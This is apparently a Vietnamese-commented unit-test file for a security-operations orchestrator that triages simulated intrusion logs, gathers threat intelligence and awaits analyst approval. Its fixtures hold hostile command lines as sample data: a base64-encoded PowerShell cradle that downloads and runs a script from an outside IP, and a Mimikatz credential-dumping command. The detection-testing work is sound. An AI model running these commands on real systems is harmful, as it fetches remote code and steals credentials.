# -*- coding: utf-8 -*-
"""
tests/test_orchestrator.py
Bộ kiểm thử đơn vị (Unit Tests) cho Central StateGraph Orchestrator.
Kiểm thử toàn diện:
1. Luồng sự cố tấn công thật (True Positive): Ingestion -> Triage -> Investigating -> Full Pipeline -> RESOLVED.
2. Luồng sự cố giả mạo/thường nhật (False Positive): Ingestion -> Triage -> Closed False Positive Short-circuit.
3. Tính toàn vẹn của IncidentState, Checkpoints và State Transition History.
4. Cơ chế Human-in-the-loop (HITL) approval hook & resume.
5. Luồng thực thi Step-by-step và Stream execution.
6. Tích hợp trực tiếp với file cảnh báo thực tế từ Wazuh SIEM.
"""

import unittest
import json
from pathlib import Path
from datetime import datetime, timezone

from src.core.schemas import (
    IncidentStatus,
    SeverityLevel,
    ActionType,
    RawLogInput,
    ParsedEvent,
    TriageOutput,
    WazuhAlert,
)
from src.core.state import IncidentState, StateTransition
from src.core.orchestrator import StateGraphOrchestrator, START, END


class TestStateGraphOrchestrator(unittest.TestCase):
    """Bộ test cases kiểm định StateGraph Orchestrator."""

    def setUp(self):
        """Khởi tạo Orchestrator trước mỗi test case."""
        self.orchestrator = StateGraphOrchestrator(auto_approve=True)
        self.data_dir = Path(__file__).resolve().parent.parent / "data" / "raw" / "wazuh"

    def test_orchestrator_initialization(self):
        """Kiểm thử khởi tạo Orchestrator và đăng ký các Node, Edges chuẩn."""
        default_orch = StateGraphOrchestrator()
        self.assertFalse(default_orch.auto_approve, "Giá trị mặc định của auto_approve phải là False.")

        expected_nodes = [
            "ingestion", "triage", "closed_fp", "enrichment",
            "rca", "response", "hitl_approval", "reporting"
        ]
        for node in expected_nodes:
            self.assertIn(node, self.orchestrator.nodes, f"Node '{node}' phải được đăng ký trong đồ thị.")

        self.assertEqual(self.orchestrator.entry_point, "ingestion")
        self.assertIn("triage", self.orchestrator.conditional_edges)
        
        # Kiểm tra sơ đồ Mermaid được sinh hợp lệ
        mermaid = self.orchestrator.to_mermaid()
        self.assertIn("flowchart TD", mermaid)
        self.assertIn("closed_fp", mermaid)

    def test_true_positive_full_pipeline(self):
        """Kiểm thử luồng sự cố tấn công thực sự (True Positive):
        Ingestion -> Triage -> Enrichment -> RCA -> Response -> HITL -> Reporting -> RESOLVED.
        """
        # Tạo dữ liệu log thô mô phỏng mã độc tấn công bằng PowerShell mã hóa
        malicious_raw = json.dumps({
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAGEALgBwAHMAMQAnACkA",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "Computer": "VICTIM-PC-01",
            "User": "FINANCE\\hoainam",
            "DestinationIp": "194.26.29.112",
            "DestinationPort": 8080,
            "Hashes": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        })

        initial_state = IncidentState(
            incident_id="INC-TP-2026-001",
            raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=malicious_raw)]
        )

        final_state = self.orchestrator.invoke(initial_state)

        # 1. Kiểm tra trạng thái cuối cùng
        self.assertEqual(final_state.status, IncidentStatus.RESOLVED)

        # 2. Kiểm tra kết quả Ingestion
        self.assertGreaterEqual(len(final_state.parsed_events), 1)
        first_event = final_state.parsed_events[0]
        self.assertEqual(first_event.process_name, "powershell.exe")
        self.assertEqual(first_event.dest_ip, "194.26.29.112")

        # 3. Kiểm tra kết quả Triage
        self.assertIsNotNone(final_state.triage_result)
        self.assertTrue(final_state.triage_result.is_incident)
        self.assertIn(final_state.triage_result.severity, [SeverityLevel.HIGH, SeverityLevel.CRITICAL])
        self.assertGreaterEqual(final_state.triage_result.confidence_score, 0.8)

        # 4. Kiểm tra CTI Enrichment
        self.assertIsNotNone(final_state.threat_intel)
        self.assertGreaterEqual(len(final_state.threat_intel.extracted_iocs), 1)
        self.assertIn("T1059.001", final_state.threat_intel.mitre_techniques)

        # 5. Kiểm tra RCA
        self.assertIsNotNone(final_state.rca_result)
        self.assertGreaterEqual(len(final_state.rca_result.process_tree), 1)

        # 6. Kiểm tra Response Recommendations
        self.assertGreaterEqual(len(final_state.recommended_actions), 1)
        action_types = [a.action_type for a in final_state.recommended_actions]
        self.assertIn(ActionType.ISOLATE_HOST, action_types)

        # 7. Kiểm tra Báo cáo cuối cùng
        self.assertIsNotNone(final_state.final_report)
        self.assertEqual(final_state.final_report.report_id, "REP-INC-TP-2026-001")
        self.assertIn("Báo cáo Điều tra Sự cố", final_state.final_report.incident_title)

    def test_false_positive_short_circuit(self):
        """Kiểm thử luồng sự cố giả mạo/thường nhật (False Positive):
        Ingestion -> Triage -> Closed False Positive (Short-circuit kết thúc ngay, không sang Enrichment).
        """
        # Tạo dữ liệu log thô mô phỏng phiên đăng nhập người dùng bình thường
        benign_raw = json.dumps({
            "EventID": 4624,
            "WorkstationName": "OFFICE-PC-02",
            "TargetUserName": "normal_employee",
            "TargetDomainName": "CORP",
            "LogonType": "2",
            "IpAddress": "127.0.0.1"
        })

        initial_state = IncidentState(
            incident_id="INC-FP-2026-002",
            raw_logs=[RawLogInput(log_source="EVTX", raw_payload=benign_raw)]
        )

        final_state = self.orchestrator.invoke(initial_state)

        # 1. Trạng thái kết thúc phải là CLOSED_FALSE_POSITIVE
        self.assertEqual(final_state.status, IncidentStatus.CLOSED_FALSE_POSITIVE)

        # 2. Triage Output xác định không phải sự cố an ninh
        self.assertIsNotNone(final_state.triage_result)
        self.assertFalse(final_state.triage_result.is_incident)
        self.assertEqual(final_state.triage_result.severity, SeverityLevel.LOW)

        # 3. Short-circuit: Tuyệt đối không thực thi các Node chuyên sâu phía sau
        self.assertIsNone(final_state.threat_intel, "Threat Intel không được thực thi khi False Positive.")
        self.assertIsNone(final_state.rca_result, "RCA không được thực thi khi False Positive.")
        self.assertEqual(len(final_state.recommended_actions), 0, "Không đề xuất hành động ngăn chặn đối với sự kiện thường nhật.")
        self.assertIsNone(final_state.final_report, "Không sinh báo cáo sự cố toàn diện cho False Positive.")

        # 4. Kiểm tra Checkpoints chỉ có ingestion, triage, closed_fp
        self.assertIn("ingestion", final_state.checkpoints)
        self.assertIn("triage", final_state.checkpoints)
        self.assertIn("closed_fp", final_state.checkpoints)
        self.assertNotIn("enrichment", final_state.checkpoints)
        self.assertNotIn("reporting", final_state.checkpoints)

    def test_state_transition_history_integrity(self):
        """Kiểm thử tính toàn vẹn của Lịch sử Chuyển dịch Trạng thái (Transition History) và Checkpoints."""
        initial_state = IncidentState(
            incident_id="INC-HIST-001",
            raw_logs=[
                RawLogInput(
                    log_source="Sysmon",
                    raw_payload=json.dumps({"EventID": 1, "CommandLine": "powershell.exe -enc AAAA", "Image": "powershell.exe"})
                )
            ]
        )

        final_state = self.orchestrator.invoke(initial_state)
        history = final_state.history

        # Phải ghi nhận ít nhất 7 bước chuyển dịch trạng thái
        self.assertGreaterEqual(len(history), 6)

        # Kiểm tra từng bản ghi chuyển đổi
        nodes_visited = [record.node for record in history]
        expected_sequence = ["ingestion", "triage", "enrichment", "rca", "response", "hitl_approval", "reporting"]
        for expected_node in expected_sequence:
            self.assertIn(expected_node, nodes_visited)

        # Kiểm tra tính hợp lệ về kiểu dữ liệu và thời gian tăng dần
        for idx in range(len(history)):
            record = history[idx]
            self.assertIsInstance(record, StateTransition)
            self.assertIsInstance(record.from_status, IncidentStatus)
            self.assertIsInstance(record.to_status, IncidentStatus)
            self.assertIsNotNone(record.message)
            self.assertIsInstance(record.metadata, dict)
            if idx > 0:
                self.assertGreaterEqual(record.timestamp, history[idx - 1].timestamp)

    def test_human_in_the_loop_approval_and_rejection(self):
        """Kiểm thử cơ chế Human-In-The-Loop (HITL): Analyst can thiệp phê duyệt hoặc từ chối."""
        raw_attack = json.dumps({
            "EventID": 1,
            "Image": "cmd.exe",
            "CommandLine": "cmd.exe /c mimikatz.exe sekurlsa::logonpasswords",
            "Computer": "DC-SERVER-01"
        })

        # Trường hợp 1: Chuyên viên SOC từ chối hành động ngăn chặn
        def custom_hitl_reject(state: IncidentState) -> IncidentState:
            state.analyst_approved = False
            state.analyst_feedback = "Máy chủ Domain Controller trọng yếu, từ chối cô lập host vào giờ làm việc."
            return state

        orch_reject = StateGraphOrchestrator(hitl_hook=custom_hitl_reject)
        state_reject = orch_reject.invoke(
            IncidentState(incident_id="INC-HITL-REJECT", raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=raw_attack)])
        )
        self.assertFalse(state_reject.analyst_approved)
        self.assertIn("từ chối cô lập host", state_reject.analyst_feedback)
        # Các hành động chưa được duyệt
        for action in state_reject.recommended_actions:
            self.assertFalse(action.is_approved)

        # Trường hợp 2: Chuyên viên SOC phê duyệt kế hoạch
        def custom_hitl_approve(state: IncidentState) -> IncidentState:
            state.analyst_approved = True
            state.analyst_feedback = "Đã xác nhận máy trạm nhiễm mã độc, phê duyệt cách ly khẩn cấp."
            return state

        orch_approve = StateGraphOrchestrator(hitl_hook=custom_hitl_approve)
        state_approve = orch_approve.invoke(
            IncidentState(incident_id="INC-HITL-APPROVE", raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=raw_attack)])
        )
        self.assertTrue(state_approve.analyst_approved)
        for action in state_approve.recommended_actions:
            self.assertTrue(action.is_approved)

    def test_stream_and_step_execution(self):
        """Kiểm thử luồng Stream từng bước và Step execution của Orchestrator."""
        raw_log = json.dumps({"EventID": 4624, "TargetUserName": "admin"})
        state = IncidentState(incident_id="INC-STREAM-001", raw_logs=[RawLogInput(log_source="EVTX", raw_payload=raw_log)])

        # Kiểm thử stream()
        steps_executed = []
        for node_name, current_state in self.orchestrator.stream(state):
            steps_executed.append(node_name)
            self.assertIsInstance(current_state, IncidentState)

        self.assertIn("ingestion", steps_executed)
        self.assertIn("triage", steps_executed)

        # Kiểm thử step() đơn lẻ
        test_state = IncidentState(incident_id="INC-STEP-001", raw_logs=[RawLogInput(log_source="EVTX", raw_payload=raw_log)])
        next_node, state_after_ingest = self.orchestrator.step("ingestion", test_state)
        self.assertEqual(next_node, "triage")
        self.assertEqual(len(state_after_ingest.parsed_events), 1)

    def test_wazuh_alerts_file_integration_true_positive(self):
        """Kiểm thử tích hợp đọc file cảnh báo thật Wazuh Scenario 1 (Phishing/Attack) qua Orchestrator."""
        scenario1_path = self.data_dir / "wazuh_alerts_scenario1_phishing.json"
        if not scenario1_path.exists():
            self.skipTest("Tệp cảnh báo Wazuh scenario 1 không tồn tại.")

        with open(scenario1_path, "r", encoding="utf-8") as f:
            alerts_data = json.load(f)

        raw_logs = [
            RawLogInput(log_source="Wazuh", raw_payload=json.dumps(alert))
            for alert in alerts_data[:3]  # Lấy 3 cảnh báo đầu tiên
        ]

        state = IncidentState(incident_id="INC-WAZUH-SCENARIO-1", raw_logs=raw_logs)
        result = self.orchestrator.invoke(state)

        self.assertEqual(result.status, IncidentStatus.RESOLVED)
        self.assertTrue(result.triage_result.is_incident)
        self.assertIsNotNone(result.final_report)
        self.assertEqual(len(result.parsed_events), 3)

    def test_wazuh_alerts_file_integration_false_positive(self):
        """Kiểm thử tích hợp đọc file cảnh báo thật Wazuh Scenario 4 (Benign Logon) kích hoạt Short-Circuit."""
        scenario4_path = self.data_dir / "wazuh_alerts_scenario4_benign.json"
        if not scenario4_path.exists():
            self.skipTest("Tệp cảnh báo Wazuh scenario 4 không tồn tại.")

        with open(scenario4_path, "r", encoding="utf-8") as f:
            alerts_data = json.load(f)

        raw_logs = [
            RawLogInput(log_source="Wazuh", raw_payload=json.dumps(alert))
            for alert in alerts_data
        ]

        state = IncidentState(incident_id="INC-WAZUH-BENIGN", raw_logs=raw_logs)
        result = self.orchestrator.invoke(state)

        # Phải đóng tại CLOSED_FALSE_POSITIVE
        self.assertEqual(result.status, IncidentStatus.CLOSED_FALSE_POSITIVE)
        self.assertFalse(result.triage_result.is_incident)
        self.assertIsNone(result.threat_intel)
        self.assertIsNone(result.final_report)


    def test_full_pipeline_with_specialized_agents_injected(self):
        """Kiểm thử toàn diện luồng StateGraph khi tiêm đủ 4 Agent chuyên biệt:
        IngestionAgent, TriageAgent, ThreatIntelAgent và RCAAgent (Tuần 8 Integration).
        """
        from src.agents.ingestion_agent import IngestionAgent
        from src.agents.triage_agent import TriageAgent
        from src.agents.threat_intel_agent import ThreatIntelAgent
        from src.agents.rca_agent import RCAAgent

        ingestion = IngestionAgent()
        triage = TriageAgent()
        threat_intel = ThreatIntelAgent()
        rca = RCAAgent()

        custom_orchestrator = StateGraphOrchestrator(
            ingestion_agent=ingestion,
            triage_agent=triage,
            threat_intel_agent=threat_intel,
            rca_agent=rca,
            auto_approve=True,
        )

        # Log chuỗi tấn công Spearphishing Macro: Word -> Cmd -> PowerShell C2
        log1 = json.dumps({
            "EventID": 1,
            "ProcessId": "1100",
            "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "CommandLine": '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "invoice_oct.docm"',
            "ParentProcessId": "800",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
            "UtcTime": "2026-11-08 09:00:00.000",
            "User": "VICTIM-CORP\\hoainam"
        })
        log2 = json.dumps({
            "EventID": 1,
            "ProcessId": "1104",
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAGEALgBwAHMAMQAnACkA",
            "ParentProcessId": "1100",
            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "UtcTime": "2026-11-08 09:00:05.000",
            "DestinationIp": "194.26.29.112"
        })

        initial_state = IncidentState(
            incident_id="INC-WEEK8-E2E-001",
            raw_logs=[
                RawLogInput(log_source="Sysmon", raw_payload=log1),
                RawLogInput(log_source="Sysmon", raw_payload=log2)
            ]
        )

        final_state = custom_orchestrator.invoke(initial_state)

        # 1. Trạng thái kết thúc
        self.assertEqual(final_state.status, IncidentStatus.RESOLVED)

        # 2. Triage Agent phát hiện tấn công
        self.assertTrue(final_state.triage_result.is_incident)
        self.assertIn(final_state.triage_result.severity, [SeverityLevel.MEDIUM, SeverityLevel.HIGH, SeverityLevel.CRITICAL])

        # 3. Threat Intel Agent làm giàu IoC và MITRE techniques
        self.assertIsNotNone(final_state.threat_intel)
        ioc_values = [ioc.value for ioc in final_state.threat_intel.extracted_iocs]
        self.assertIn("194.26.29.112", ioc_values)
        self.assertTrue(any(ioc.is_malicious for ioc in final_state.threat_intel.extracted_iocs))

        # 4. RCA Agent phục dựng cây tiến trình và xác định Patient Zero
        self.assertIsNotNone(final_state.rca_result)
        self.assertGreaterEqual(len(final_state.rca_result.process_tree), 2)
        patient_zero = next((p for p in final_state.rca_result.process_tree if p.is_malicious_origin), None)
        self.assertIsNotNone(patient_zero)
        self.assertIn("WINWORD.EXE", patient_zero.process_name)
        self.assertIn("Spearphishing", final_state.rca_result.initial_access_vector)
        self.assertGreaterEqual(len(final_state.rca_result.attack_timeline), 2)

        # 5. Báo cáo cuối cùng tổng hợp thông tin từ 2 agent chuyên sâu
        self.assertIsNotNone(final_report := final_state.final_report)
        self.assertIn("Spearphishing", final_report.detailed_findings)

    def test_prototype_v01_full_pipeline_with_all_6_agents(self):
        """Kiểm thử Prototype v0.1: Toàn bộ 6 Agent tích hợp vào StateGraph Orchestrator (Tuần 9).
        Luồng: IngestionAgent -> TriageAgent -> ThreatIntelAgent -> RCAAgent -> ResponseAgent -> HITL -> ReportingAgent
        """
        from src.core.orchestrator import create_full_soc_pipeline
        from src.agents import ReportingAgent

        # Khởi tạo Full Pipeline qua factory với chế độ tự động duyệt để kiểm thử luồng trọn vẹn
        pipeline = create_full_soc_pipeline(auto_approve=True)
        self.assertIsNotNone(pipeline.response_agent)
        self.assertIsNotNone(pipeline.reporting_agent)

        # Log chuỗi tấn công Spearphishing Macro với C2 IP và Powershell
        log1 = json.dumps({
            "EventID": 1,
            "ProcessId": "2100",
            "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "CommandLine": '"WINWORD.EXE" /n "malicious_payload.docm"',
            "ParentProcessId": "900",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "Computer": "ACCOUNTING-PC-01",
            "User": "VICTIM-CORP\\namnp",
            "UtcTime": "2026-11-15 10:00:00.000"
        })
        log2 = json.dumps({
            "EventID": 1,
            "ProcessId": "2104",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAGEALgBwAHMAMQAnACkA",
            "ParentProcessId": "2100",
            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "Computer": "ACCOUNTING-PC-01",
            "User": "VICTIM-CORP\\namnp",
            "DestinationIp": "194.26.29.112",
            "DestinationPort": 443,
            "Hashes": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "UtcTime": "2026-11-15 10:00:05.000"
        })

        state = IncidentState(
            incident_id="INC-PROTO-v01-001",
            raw_logs=[
                RawLogInput(log_source="Sysmon", raw_payload=log1),
                RawLogInput(log_source="Sysmon", raw_payload=log2)
            ]
        )

        final_state = pipeline.invoke(state)

        # 1. Pipeline hoàn tất với trạng thái RESOLVED
        self.assertEqual(final_state.status, IncidentStatus.RESOLVED)

        # 2. Ingestion & Triage
        self.assertEqual(len(final_state.parsed_events), 2)
        self.assertTrue(final_state.triage_result.is_incident)

        # 3. Threat Intelligence
        self.assertIsNotNone(final_state.threat_intel)
        c2_ioc = next((i for i in final_state.threat_intel.extracted_iocs if i.value == "194.26.29.112"), None)
        self.assertIsNotNone(c2_ioc)

        # 4. RCA Agent
        self.assertIsNotNone(final_state.rca_result)
        self.assertIn("Spearphishing", final_state.rca_result.initial_access_vector)
        self.assertGreaterEqual(len(final_state.rca_result.process_tree), 2)

        # 5. Response Agent (Track 1)
        self.assertGreaterEqual(len(final_state.recommended_actions), 2)
        action_types = [a.action_type for a in final_state.recommended_actions]
        self.assertIn(ActionType.BLOCK_IP, action_types)
        # Kiểm tra HITL đã duyệt
        self.assertTrue(all(a.is_approved is True for a in final_state.recommended_actions))

        # 6. Reporting Agent (Track 2)
        self.assertIsNotNone(final_state.final_report)
        report = final_state.final_report
        self.assertEqual(report.report_id, "REP-INC-PROTO-v01-001")
        self.assertIn("ACCOUNTING-PC-01", report.executive_summary)
        self.assertGreaterEqual(len(report.ioc_table), 1)
        self.assertGreaterEqual(len(report.action_plan), 2)

        # 7. Xuất Markdown báo cáo
        md_content = ReportingAgent.export_markdown(report)
        self.assertIn("Báo cáo Điều tra Sự cố", md_content)
        self.assertIn("Action Plan", md_content)

    def test_prototype_v01_hitl_rejection_flow(self):
        """Kiểm thử luồng HITL Rejection: Chuyên viên từ chối kế hoạch hành động."""
        from src.core.orchestrator import create_full_soc_pipeline

        def reject_hook(state: IncidentState) -> IncidentState:
            state.analyst_approved = False
            state.analyst_feedback = "Tạm dừng hành động do máy trạm thuộc máy chủ Core Database"
            return state

        pipeline = create_full_soc_pipeline(hitl_hook=reject_hook)

        log_payload = json.dumps({
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAGEALgBwAHMAMQAnACkA",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "Computer": "CORE-DB-01",
            "User": "DBADMIN\\root",
            "DestinationIp": "194.26.29.112"
        })

        state = IncidentState(
            incident_id="INC-HITL-REJECT-001",
            raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=log_payload)]
        )

        final_state = pipeline.invoke(state)

        # Hành động bị từ chối
        for action in final_state.recommended_actions:
            self.assertFalse(action.is_approved)

        self.assertIsNotNone(final_state.final_report)
        self.assertIn("Chuyên viên An ninh đã từ chối", final_state.final_report.executive_summary)

    def test_execute_until_interrupt_and_resume_with_decisions(self):
        """Kiểm thử cơ chế StateGraph Interrupt & Resume với HITLManager và danh sách HITLDecision."""
        from src.core.hitl_manager import HITLManager, HITLDecision, DecisionType

        hitl_mgr = HITLManager()
        pipeline = StateGraphOrchestrator(hitl_manager=hitl_mgr, auto_approve=False)

        attack_payload = json.dumps({
            "EventID": 1,
            "Image": "powershell.exe",
            "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAGEALgBwAHMAMQAnACkA",
            "Computer": "VICTIM-PC-01",
            "DestinationIp": "194.26.29.112"
        })

        initial_state = IncidentState(
            incident_id="INC-INT-RESUME-001",
            raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=attack_payload)]
        )

        # 1. Chạy cho đến khi ngắt
        is_paused, paused_state = pipeline.execute_until_interrupt(initial_state)
        self.assertTrue(is_paused)
        self.assertEqual(paused_state.status, IncidentStatus.AWAITING_APPROVAL)
        self.assertIsNone(paused_state.final_report)

        # Kiểm tra danh sách hành động chờ duyệt
        pending = hitl_mgr.get_pending_actions(paused_state)
        self.assertGreaterEqual(len(pending), 1)

        # 2. Chuyên viên đưa ra quyết định
        decisions = []
        for idx, act in enumerate(pending):
            if idx == 0:
                decisions.append(
                    HITLDecision(
                        decision_type=DecisionType.APPROVE,
                        action_id=act.action_id,
                        analyst_id="soc_analyst_01",
                        feedback_notes="Chấp thuận cách ly khẩn cấp"
                    )
                )
            else:
                decisions.append(
                    HITLDecision(
                        decision_type=DecisionType.MODIFY,
                        action_id=act.action_id,
                        modified_parameters={"timeout_sec": 7200},
                        analyst_id="soc_analyst_01",
                        feedback_notes="Hiệu chỉnh thời gian hiệu lực"
                    )
                )

        # 3. Tiếp tục pipeline từ điểm ngắt
        resumed_state = pipeline.resume_from_interrupt(paused_state, decisions=decisions)

        self.assertEqual(resumed_state.status, IncidentStatus.RESOLVED)
        self.assertTrue(hitl_mgr.is_approval_complete(resumed_state))
        self.assertIsNotNone(resumed_state.final_report)
        self.assertTrue(resumed_state.analyst_approved)

    def test_execute_until_interrupt_false_positive_no_pause(self):
        """Kiểm thử False Positive chạy qua execute_until_interrupt không bị tạm dừng mà kết thúc sớm."""
        from src.core.hitl_manager import HITLManager

        hitl_mgr = HITLManager()
        pipeline = StateGraphOrchestrator(hitl_manager=hitl_mgr, auto_approve=False)

        benign_raw = json.dumps({
            "EventID": 4624,
            "WorkstationName": "OFFICE-PC-01",
            "TargetUserName": "user01",
            "IpAddress": "127.0.0.1"
        })

        initial_state = IncidentState(
            incident_id="INC-FP-INT-001",
            raw_logs=[RawLogInput(log_source="EVTX", raw_payload=benign_raw)]
        )

        is_paused, final_state = pipeline.execute_until_interrupt(initial_state)
        self.assertFalse(is_paused)
        self.assertEqual(final_state.status, IncidentStatus.CLOSED_FALSE_POSITIVE)

    def test_backtracking_hitl_rejection_adaptive_loop(self):
        """Kiểm thử chu trình quay lui (Backtracking & Feedback Loop):
        1. Response đề xuất ISOLATE_HOST.
        2. Chuyên viên từ chối kèm phản hồi 'Domain Controller, từ chối cô lập host'.
        3. Orchestrator kích hoạt Feedback Loop quay ngược lại Response Node.
        4. ResponseAgent thích ứng, tự động loại bỏ ISOLATE_HOST.
        5. Lần 2 chuyên viên phê duyệt kế hoạch đã điều chỉnh.
        6. Đồ thị hoàn tất thành công với reanalysis_count == 1.
        """
        from src.core.orchestrator import create_full_soc_pipeline

        attempt_count = 0

        def dynamic_analyst(state: IncidentState) -> IncidentState:
            nonlocal attempt_count
            attempt_count += 1
            # Lần 1: Phát hiện có hành động ISOLATE_HOST -> Từ chối
            has_isolate = any(a.action_type == ActionType.ISOLATE_HOST for a in state.recommended_actions)
            if has_isolate:
                state.analyst_approved = False
                state.analyst_feedback = "Máy chủ Domain Controller trọng yếu, từ chối cô lập host."
            else:
                # Lần 2: Agent đã tự bỏ ISOLATE_HOST theo feedback -> Phê duyệt
                state.analyst_approved = True
                state.analyst_feedback = "Kế hoạch đã điều chỉnh hợp lý, phê duyệt xử lý tiến trình và chặn IP."
            return state

        pipeline = create_full_soc_pipeline(hitl_hook=dynamic_analyst)

        malicious_log = json.dumps({
            "EventID": 1,
            "Image": "powershell.exe",
            "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAGEALgBwAHMAMQAnACkA",
            "Computer": "DC-SERVER-01",
            "DestinationIp": "194.26.29.112"
        })

        initial_state = IncidentState(
            incident_id="INC-BACKTRACK-001",
            raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=malicious_log)]
        )

        final_state = pipeline.invoke(initial_state)

        # 1. Đã trải qua đúng 1 vòng quay lui phân tích lại
        self.assertEqual(final_state.reanalysis_count, 1)
        self.assertEqual(attempt_count, 2)

        # 2. Ở lần cuối, chuyên viên đã phê duyệt
        self.assertTrue(final_state.analyst_approved)
        self.assertEqual(final_state.status, IncidentStatus.RESOLVED)

        # 3. Kế hoạch hành động cuối cùng không còn ISOLATE_HOST
        final_action_types = [a.action_type for a in final_state.recommended_actions]
        self.assertNotIn(ActionType.ISOLATE_HOST, final_action_types)
        self.assertIn(ActionType.BLOCK_IP, final_action_types)

        # 4. Kiểm tra lịch sử chuyển đổi có ghi nhận bước Feedback Loop
        feedback_transitions = [
            t for t in final_state.history
            if t.node == "hitl_approval" and "Feedback Loop" in (t.message or "")
        ]
        self.assertGreaterEqual(len(feedback_transitions), 1)

    def test_backtracking_reaches_max_reanalysis_guardrail(self):
        """Kiểm thử chốt chặn chống lặp vô hạn (Infinite Loop Guardrail):
        Nếu chuyên viên liên tục từ chối, pipeline chỉ quay lui tối đa max_reanalysis lần rồi kết thúc an toàn.
        """
        rejection_attempts = 0

        def persistent_reject(state: IncidentState) -> IncidentState:
            nonlocal rejection_attempts
            rejection_attempts += 1
            state.analyst_approved = False
            state.analyst_feedback = f"Từ chối phương án lần {rejection_attempts}"
            return state

        pipeline = StateGraphOrchestrator(
            hitl_hook=persistent_reject,
            max_reanalysis=2
        )

        log_payload = json.dumps({
            "EventID": 1,
            "Image": "cmd.exe",
            "CommandLine": "cmd.exe /c mimikatz.exe",
            "Computer": "VICTIM-PC-01"
        })

        initial_state = IncidentState(
            incident_id="INC-GUARDRAIL-001",
            raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=log_payload)]
        )

        final_state = pipeline.invoke(initial_state)

        # Số lần quay lui bị chặn đúng bằng max_reanalysis (2)
        self.assertEqual(final_state.reanalysis_count, 2)
        # Tổng số lần vào hitl_approval là 3 (lần 1 ban đầu + 2 lần retry)
        self.assertEqual(rejection_attempts, 3)
        # Báo cáo vẫn được sinh thành công và ghi nhận trạng thái từ chối
        self.assertIsNotNone(final_state.final_report)
        self.assertFalse(final_state.analyst_approved)

    def test_self_correction_threat_intel_escalation(self):
        """Kiểm thử cơ chế Tự sửa sai (Self-Correction Escalation Loop):
        Khi Triage ban đầu đánh giá mức LOW, nhưng Threat Intel phát hiện C2 IP nguy cơ cao (92/100),
        hệ thống tự động nâng cấp severity lên CRITICAL.
        """
        orch = StateGraphOrchestrator()

        state = IncidentState(
            incident_id="INC-SELF-CORRECT-001",
            raw_logs=[RawLogInput(log_source="Sysmon", raw_payload="{}")],
            parsed_events=[
                ParsedEvent(
                    event_id="EVT-01",
                    source_type="Sysmon",
                    timestamp=datetime.now(timezone.utc),
                    dest_ip="194.26.29.112",  # Cobalt Strike IP trong mock DB
                    process_name="powershell.exe"
                )
            ],
            triage_result=TriageOutput(
                is_incident=True,
                confidence_score=0.6,
                severity=SeverityLevel.LOW,
                summary="Nghi ngờ hoạt động người dùng thông thường",
                rule_or_model="Initial-Triage"
            )
        )

        # Chạy node enrichment
        enriched_state = orch.enrichment_node(state)

        # Severity phải được tự động sửa từ LOW lên CRITICAL
        self.assertEqual(enriched_state.triage_result.severity, SeverityLevel.CRITICAL)
        self.assertIn("Self-Correction", enriched_state.triage_result.summary)

